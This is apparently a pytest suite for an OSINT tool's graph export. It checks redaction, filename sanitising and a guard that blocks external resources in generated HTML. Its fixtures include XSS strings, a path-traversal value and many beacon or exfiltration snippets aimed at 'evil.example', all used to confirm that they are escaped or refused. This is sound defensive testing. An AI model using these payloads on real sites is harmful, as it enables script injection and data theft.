import json
import re
import sys

import pytest
from typer.testing import CliRunner

from secure_osint.core.graph import GRAPH_MISSING_MSG, STYLES, graph_elements, graph_filename
from secure_osint.core.privacy import CATEGORIES, PrivacyGuard
from tests.owner_only import assert_owner_only

# Correlazioni GREZZE (come se qualcuno passasse dati non redatti): il grafo deve redigerle da sé.
RAW = {
    'primary_target': 'example.com',
    'usernames': ['examplecorp'],
    'emails': ['ceo@example.com', 'cfo@example.com'],
    'domains': ['example.com', 'example.org'],
    'infrastructure': ['93.184.216.34', '10.0.0.9', 'ns1.example.com'],
}
_EXTERNAL = re.compile(r'(?:src|href)\s*=\s*["\']https?://', re.IGNORECASE)


def _by_label(nodes):
    return {n['label']: n for n in nodes}


# --- structure: nodes and edges (pure Python, runs in CI) ---


def test_primary_target_is_a_large_red_star():
    nodes, _ = graph_elements(RAW)
    target = nodes[0]
    assert target['id'] == 'target' and target['label'] == 'example.com'
    assert (target['shape'], target['color']) == ('star', STYLES['target']['color'])
    assert target['size'] > max(style.get('size', 0) for name, style in STYLES.items() if name != 'target')


def test_each_entity_type_has_its_own_shape_and_color():
    nodes = _by_label(graph_elements(RAW)[0])
    assert (nodes['examplecorp']['shape'], nodes['examplecorp']['color']) == ('dot', '#3e8ef7')
    assert (nodes['example.org']['shape'], nodes['example.org']['color']) == ('square', '#30a46c')
    assert (nodes['ns1.example.com']['shape'], nodes['ns1.example.com']['color']) == ('triangle', '#f5a524')


def test_one_edge_from_target_to_every_entity():
    nodes, edges = graph_elements(RAW)
    assert len(edges) == len(nodes) - 1
    assert all(e['from'] == 'target' for e in edges)
    assert {e['to'] for e in edges} == {n['id'] for n in nodes[1:]}


def test_entity_equal_to_target_is_not_duplicated():
    # 'example.com' is both the target and a domain: no second node, no self-loop.
    nodes, edges = graph_elements(RAW)
    assert [n['label'] for n in nodes].count('example.com') == 1
    assert all(e['to'] != 'target' for e in edges)


def test_empty_correlations_give_a_lone_target():
    nodes, edges = graph_elements({'primary_target': 'octocat'})
    assert [n['label'] for n in nodes] == ['octocat'] and edges == []


# --- tree layout (pure Python, runs in CI) ---


def test_tree_layout_places_different_categories_in_different_columns():
    nodes, _ = graph_elements(RAW)
    found = next(n for n in nodes if n['category'] == 'found')
    infra = next(n for n in nodes if n['category'] == 'infrastructure')
    assert found['x'] != infra['x']
    assert found['y'] > 0 and infra['y'] > 0


def test_tree_layout_stacks_same_category_nodes_vertically_without_overlap():
    corr = {'primary_target': 'example.com', 'infrastructure': ['93.184.216.34', 'ns1.example.com']}
    nodes, _ = graph_elements(corr)
    infra_nodes = [n for n in nodes if n['category'] == 'infrastructure']
    assert len(infra_nodes) == 2
    assert len({n['x'] for n in infra_nodes}) == 1  # same column
    ys = sorted(n['y'] for n in infra_nodes)
    assert ys[0] < ys[1]  # distinct rows


def test_target_position_is_not_assigned_by_the_tree_layout():
    nodes, _ = graph_elements(RAW)
    assert 'x' not in nodes[0] and 'y' not in nodes[0]  # network_from_model fixes it at (0, 0)


# --- redaction (pure Python, runs in CI) ---


def test_emails_and_ips_are_redacted_by_default():
    nodes, edges = graph_elements(RAW)
    dumped = json.dumps([nodes, edges])
    for secret in ('ceo@example.com', 'cfo@example.com', '93.184.216.34', '10.0.0.9'):
        assert secret not in dumped
    assert '[REDACTED]' in dumped
    # Non-PII survives: domains and hostnames are the investigative subject.
    assert 'example.org' in dumped and 'ns1.example.com' in dumped


def test_redacted_values_collapse_into_one_node_per_type():
    nodes, _ = graph_elements(RAW)
    redacted = [n for n in nodes if n['label'] == '[REDACTED]']
    assert sorted(n['id'] for n in redacted) == ['emails:[REDACTED]', 'infrastructure:[REDACTED]']
    assert all('redacted' in n['title'] for n in redacted)


def test_keep_network_guard_reveals_ips_but_not_emails():
    guard = PrivacyGuard(categories=CATEGORIES - {'network'})  # same guard as --keep-network
    dumped = json.dumps(graph_elements(RAW, guard=guard))
    assert '93.184.216.34' in dumped
    assert 'ceo@example.com' not in dumped  # emails are 'personal': never revealed


def test_redacted_false_uses_values_as_given():
    dumped = json.dumps(graph_elements(RAW, redacted=False))
    assert '93.184.216.34' in dumped and 'ceo@example.com' in dumped


def test_email_target_is_redacted_in_the_graph():
    nodes, _ = graph_elements({'primary_target': 'jane@example.org', 'domains': ['example.org']})
    assert nodes[0]['label'] == '[REDACTED]'
    assert 'jane@example.org' not in json.dumps(nodes)


# --- output file name (pure Python, runs in CI) ---


@pytest.mark.parametrize(
    'case_id,expected',
    [
        (None, 'latest_graph.html'),
        ('', 'latest_graph.html'),
        ('ACME-2026-014', 'ACME-2026-014_graph.html'),
        ('../../etc/passwd', 'etc_passwd_graph.html'),
        ('..', 'latest_graph.html'),
        ('a/b\\c d', 'a_b_c_d_graph.html'),
    ],
)
def test_graph_filename_is_safe(case_id, expected):
    name = graph_filename(case_id)
    assert name == expected
    assert '/' not in name and '\\' not in name and not name.startswith('.')


# --- optional extra missing (runs in CI) ---


def test_missing_pyvis_raises_install_hint(monkeypatch):
    from secure_osint.core.graph import build_correlation_graph

    monkeypatch.setitem(sys.modules, 'pyvis', None)
    monkeypatch.setitem(sys.modules, 'pyvis.network', None)
    with pytest.raises(RuntimeError, match=re.escape(GRAPH_MISSING_MSG)):
        build_correlation_graph(RAW)


def test_cli_graph_without_pyvis_fails_before_running(monkeypatch, tmp_path):
    from secure_osint.cli import app

    ran = []
    monkeypatch.setitem(sys.modules, 'pyvis', None)
    monkeypatch.setitem(sys.modules, 'pyvis.network', None)
    monkeypatch.setattr('secure_osint.core.engine.WorkflowEngine.execute', lambda *a, **k: ran.append(1))
    result = CliRunner().invoke(app, ['run', 'example.com', '--graph', '-q', '--output-dir', str(tmp_path)])
    assert result.exit_code == 1
    assert GRAPH_MISSING_MSG in result.output
    assert ran == [] and not any(tmp_path.iterdir())  # no investigation, no reports: fail fast


def test_gui_keeps_the_report_when_pyvis_is_missing(monkeypatch, tmp_path):
    from secure_osint import app as gui_app

    class FakeEngine:
        def __init__(self, **kwargs):
            pass

        def execute(self, wf, input_str):
            return {'dns': {'status': 'SUCCESS', 'data': {'NS': ['ns1.example.com']}}}

    monkeypatch.setitem(sys.modules, 'pyvis', None)
    monkeypatch.setitem(sys.modules, 'pyvis.network', None)
    monkeypatch.setattr('secure_osint.core.engine.WorkflowEngine', FakeEngine)
    monkeypatch.setattr(gui_app, '_open_cache', lambda ttl: None)
    markdown, files, panel = gui_app.run_investigation(
        'example.com', agreed=True, generate_graph=True, output_dir=str(tmp_path)
    )
    assert '# OSINT Report' in markdown and len(files) == 2  # report intact, no graph file
    assert 'secure-osint[graph]' in panel and '<iframe' not in panel


# --- rendering with pyvis (skipped where the 'graph' extra is not installed) ---


def test_build_correlation_graph_returns_dark_network():
    pytest.importorskip('pyvis')
    from secure_osint.core.graph import BACKGROUND, build_correlation_graph

    net = build_correlation_graph(RAW)
    assert len(net.nodes) == len(graph_elements(RAW)[0])
    assert len(net.edges) == len(graph_elements(RAW)[1])
    assert net.bgcolor == BACKGROUND
    assert {n['shape'] for n in net.nodes} == {'star', 'dot', 'square', 'triangle'}


def test_physics_is_off_for_the_deterministic_tree_layout():
    pytest.importorskip('pyvis')
    from secure_osint.core.graph import build_correlation_graph

    net = build_correlation_graph(RAW)
    assert net.options.physics.enabled is False


def test_card_fields_are_added_for_entity_nodes_but_not_the_target():
    pytest.importorskip('pyvis')
    from secure_osint.core.graph import build_correlation_graph

    net = build_correlation_graph(RAW)
    by_id = {n['id']: n for n in net.nodes}
    assert 'card' not in by_id['target']
    entity = by_id['usernames:examplecorp']
    assert entity['card'] is True
    assert entity['cardIcon'] == 'dot'
    assert entity['cardColor'] == '#3e8ef7'
    assert entity['cardType'] == 'Platform'
    assert entity['cardConfidence'] == ''


def test_pivot_card_icon_color_uses_the_border_of_its_dict_color():
    pytest.importorskip('pyvis')
    from secure_osint.core.graph import build_correlation_graph

    net = build_correlation_graph({'primary_target': 'example.com', 'suggested_pivots': ['Name: John Doe']})
    pivot = next(n for n in net.nodes if n['id'].startswith('pivot:'))
    assert pivot['card'] is True
    assert pivot['cardColor'] == '#9ca3af'  # STYLES['pivot']['color']['border'], not the dict itself
    assert pivot['cardIcon'] == 'box'


def test_exported_html_is_self_contained_private_and_redacted(tmp_path):
    pytest.importorskip('pyvis')
    from secure_osint.core.graph import build_correlation_graph, save_graph_html

    path = save_graph_html(build_correlation_graph(RAW), tmp_path / 'g.html')
    html = path.read_text(encoding='utf-8')
    assert not _EXTERNAL.search(html)  # opening it contacts no CDN: works offline
    assert 'vis.Network' in html  # vis-network is inlined
    assert 'Investigation graph' in html  # legend
    assert_owner_only(path)
    for secret in ('ceo@example.com', '93.184.216.34', '10.0.0.9'):
        assert secret not in html


def test_inspector_uses_textcontent_never_innerhtml(tmp_path):
    # Checks our own injected script, not the whole page: pyvis's bundled utils.js legitimately
    # uses innerHTML for its own unrelated neighborhood-highlight popup.
    pytest.importorskip('pyvis')
    from secure_osint.core.graph import _CARD_JS, build_correlation_graph, save_graph_html

    assert 'card-inspector' in _CARD_JS
    assert 'textContent' in _CARD_JS
    assert '.innerHTML' not in _CARD_JS  # the actual hazard; a comment may still *mention* the word
    html = save_graph_html(build_correlation_graph(RAW), tmp_path / 'g.html').read_text(encoding='utf-8')
    assert 'card-inspector' in html


def test_script_injection_in_target_is_escaped(tmp_path):
    pytest.importorskip('pyvis')
    from secure_osint.core.graph import build_correlation_graph, save_graph_html

    evil = '</script><script>alert(1)</script>'
    html = save_graph_html(build_correlation_graph({'primary_target': evil}), tmp_path / 'e.html').read_text(
        encoding='utf-8'
    )
    assert evil not in html and '<script>alert(1)' not in html


def test_export_fails_closed_if_external_resources_remain(tmp_path, monkeypatch):
    pytest.importorskip('pyvis')
    from secure_osint.core import graph as graph_mod

    net = graph_mod.build_correlation_graph(RAW)
    original = net.generate_html
    # Simulates a future pyvis template loading a resource in a form we don't strip.
    monkeypatch.setattr(net, 'generate_html', lambda: original() + '<img src="https://tracker.example/x.png">')
    with pytest.raises(RuntimeError, match='external resources'):
        graph_mod.save_graph_html(net, tmp_path / 'g.html')
    assert not (tmp_path / 'g.html').exists()


def test_cli_graph_writes_case_named_html(monkeypatch, tmp_path):
    pytest.importorskip('pyvis')
    from secure_osint.cli import app
    from secure_osint.core.workflow import StepResult, StepStatus

    dns = StepResult(status=StepStatus.SUCCESS, data={'A': ['93.184.216.34'], 'NS': ['ns1.example.com']})
    monkeypatch.setattr('secure_osint.core.engine.WorkflowEngine.execute', lambda self, wf, inp: {'dns': dns})
    result = CliRunner().invoke(
        app,
        ['run', 'example.com', '--graph', '--no-cache', '--case-id', 'PI/7', '--output-dir', str(tmp_path)],
    )
    assert result.exit_code == 0, result.output
    graph_file = tmp_path / 'PI_7_graph.html'
    assert graph_file.is_file()
    assert 'Interactive graph saved to' in result.output
    html = graph_file.read_text(encoding='utf-8')
    assert 'ns1.example.com' in html and '93.184.216.34' not in html  # same redaction as the report


def test_gui_embeds_graph_in_sandboxed_iframe(monkeypatch, tmp_path):
    pytest.importorskip('pyvis')
    from secure_osint import app as gui_app

    class FakeEngine:
        def __init__(self, **kwargs):
            pass

        def execute(self, wf, input_str):
            return {'dns': {'status': 'SUCCESS', 'data': {'NS': ['ns1.example.com']}}}

    monkeypatch.setattr('secure_osint.core.engine.WorkflowEngine', FakeEngine)
    monkeypatch.setattr(gui_app, '_open_cache', lambda ttl: None)
    _, files, panel = gui_app.run_investigation(
        'example.com', agreed=True, generate_graph=True, case_id='C-1', output_dir=str(tmp_path)
    )
    assert files[-1].endswith('C-1_graph.html')
    sandbox = panel.split('sandbox="', 1)[1].split('"', 1)[0].split()
    assert '<iframe' in panel and 'allow-scripts' in sandbox
    assert 'allow-same-origin' not in sandbox  # graph JS cannot reach the Gradio page
    assert 'srcdoc="' in panel and '<script' not in panel.split('srcdoc="', 1)[1][:200]  # escaped


def test_no_graph_requested_means_empty_panel(monkeypatch, tmp_path):
    from secure_osint import app as gui_app

    class FakeEngine:
        def __init__(self, **kwargs):
            pass

        def execute(self, wf, input_str):
            return {}

    monkeypatch.setattr('secure_osint.core.engine.WorkflowEngine', FakeEngine)
    monkeypatch.setattr(gui_app, '_open_cache', lambda ttl: None)
    _, files, panel = gui_app.run_investigation('example.com', agreed=True, output_dir=str(tmp_path))
    assert panel == '' and len(files) == 2


# --- external-resource guard (pure Python: a fake network, no pyvis needed) ---

_PAGE = '<html><head><meta charset="utf-8"><style>body{margin:0}</style></head><body>{}</body></html>'


class _FakeNetwork:
    def __init__(self, body: str) -> None:
        self.body = body

    def generate_html(self) -> str:
        return _PAGE.replace('{}', self.body)


@pytest.mark.parametrize(
    'body',
    [
        '<img src="https://tracker.example/x.png">',
        '<img src="//tracker.example/x.png">',  # protocol-relative
        "<img src='//tracker.example/x.png'>",
        '<img src=//tracker.example/x.png>',  # unquoted
        '<img srcset="a.png 1x, https://tracker.example/b.png 2x">',
        '<img srcset="//tracker.example/b.png 2x">',
        '<style>@import "https://evil.example/x.css";</style>',
        '<style>@import url(//evil.example/x.css);</style>',
        '<style>body{background:url(https://evil.example/bg.png)}</style>',
        '<style>body{background:url( "//evil.example/bg.png" )}</style>',
        '<div style="background-image:url(\'https://evil.example/p.png\')"></div>',
        '<link rel="stylesheet" href="//cdn.example/x.css">',
        '<link rel="dns-prefetch" href="evil.example">',
        '<link rel="preconnect" href="evil.example">',
        '<iframe src="about:blank"></iframe>',
        '<object data="https://evil.example/x.swf"></object>',
        '<object data="x.swf"></object>',
        '<embed src="x.swf">',
        '<base href="https://evil.example/">',
        '<form action="https://evil.example/collect"></form>',
        '<video poster="https://evil.example/p.png"></video>',
        '<a ping="https://evil.example/ping" href="#">x</a>',
        '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
        '<svg><image xlink:href="https://evil.example/i.png"/></svg>',
        '<script>fetch("https://evil.example/c")</script>',
        '<script>fetch(url)</script>',  # no literal URL: the API itself is not allowed
        '<script>var x = new XMLHttpRequest(); x.open("GET", "/a");</script>',
        '<script>new WebSocket("wss://evil.example/s")</script>',
        '<script>new EventSource("/s")</script>',
        '<script>importScripts("https://evil.example/w.js")</script>',
        '<script>navigator.sendBeacon("/b", d)</script>',
        '<script>import("https://evil.example/m.js")</script>',
        '<script>var s = document.createElement("script"); s.src = "//evil.example/x.js";</script>',
        '<script>el.setAttribute("src", "https://evil.example/x.js")</script>',
        '<script src="//evil.example/x.js"></script>',
        '<body onload="fetch(\'/x\')">',
    ],
)
def test_guard_refuses_every_external_resource_form(tmp_path, body):
    from secure_osint.core.graph import external_references, render_graph_html, save_graph_html

    assert external_references(_PAGE.replace('{}', body)), body
    with pytest.raises(RuntimeError, match='external resources'):
        render_graph_html(_FakeNetwork(body))
    with pytest.raises(RuntimeError):
        save_graph_html(_FakeNetwork(body), tmp_path / 'g.html')
    assert not (tmp_path / 'g.html').exists()


@pytest.mark.parametrize(
    'body',
    [
        # Node data reaches the page only as tojson-escaped double-quoted strings: their WORDS must not
        # make the export fail (a bio mentioning an API name or a URL is just text).
        '<script>nodes = new vis.DataSet([{"title": "I like fetch(x), WebSocket and XMLHttpRequest"}]);</script>',
        '<script>nodes = new vis.DataSet([{"title": "url(//x.example) and @import and src=\\"//a.b\\""}]);</script>',
        '<script>var ns = "http://www.w3.org/2000/svg";</script>',  # namespace string in a library
        '<script>// see https://github.com/visjs\nvar a = 1;</script>',
        '<a href="#top">top</a><img src="data:image/png;base64,AAAA">',
        '<style>body{background:url(data:image/png;base64,AAAA)}</style>',
    ],
)
def test_guard_does_not_flag_inert_text(body):
    from secure_osint.core.graph import external_references, render_graph_html

    assert external_references(_PAGE.replace('{}', body)) == []
    assert '</body>' in render_graph_html(_FakeNetwork(body))


def test_pyvis_bootstrap_cdn_tags_are_still_stripped_not_refused():
    from secure_osint.core.graph import render_graph_html

    body = (
        '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5/dist/css/bootstrap.min.css" rel="stylesheet">'
        '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5/dist/js/bootstrap.bundle.min.js"></script>'
    )
    html = render_graph_html(_FakeNetwork(body))
    assert 'cdn.jsdelivr.net' not in html


def test_real_pyvis_page_passes_the_broadened_guard():
    pytest.importorskip('pyvis')
    from secure_osint.core.graph import build_correlation_graph, external_references, render_graph_html

    html = render_graph_html(build_correlation_graph(RAW))
    assert external_references(html) == []


# --- C5 entities in the graph ---


def test_c5_entities_become_nodes_in_existing_filter_categories():
    from secure_osint.core.graph import FILTERS

    corr = {
        'primary_target': 'photo.jpg',
        'locations': ['[REDACTED]'],
        'devices': ['Canon EOS 5D (serial [REDACTED])'],
        'wallets': ['ETH [REDACTED]'],
        'phones': ['[REDACTED]'],
        'relations': [
            {'from': 'photo.jpg', 'to': 'Canon EOS 5D (serial [REDACTED])', 'type': 'taken with', 'bucket': 'devices'},
            {'from': 'photo.jpg', 'to': '[REDACTED]', 'type': 'photo taken at', 'bucket': 'locations'},
        ],
    }
    nodes, edges = graph_elements(corr)
    by_id = {n['id']: n for n in nodes}
    assert {'locations:[REDACTED]', 'devices:Canon EOS 5D (serial [REDACTED])', 'wallets:ETH [REDACTED]'} <= set(by_id)
    assert 'phones:[REDACTED]' in by_id  # same placeholder as the location, different bucket: distinct node
    for node in nodes:
        assert node['category'] in FILTERS or node['category'] == 'target'
    labels = {e['to']: e['label'] for e in edges}
    assert labels['devices:Canon EOS 5D (serial [REDACTED])'] == 'taken with'
    assert labels['locations:[REDACTED]'] == 'photo taken at'
    assert labels['wallets:ETH [REDACTED]'] == 'observed with'  # co-occurrence, not identity
    assert by_id['locations:[REDACTED]']['title'].startswith('location')


def test_tooltips_are_never_rendered_as_html():
    # pyvis switches to a custom popup that does `popup.innerHTML = nodeData[0].title` as soon as any
    # node title contains 'href'. Titles carry target-controlled text (bios, display names).
    pytest.importorskip('pyvis')
    from secure_osint.core.graph import build_correlation_graph, render_graph_html

    raw = {**RAW, 'usernames': ['<img src=x onerror=alert(1)> see href=']}
    html = render_graph_html(build_correlation_graph(raw, redacted=False))
    assert 'popup.innerHTML' not in html
    assert 'popup.textContent = nodeData[0].title' in html
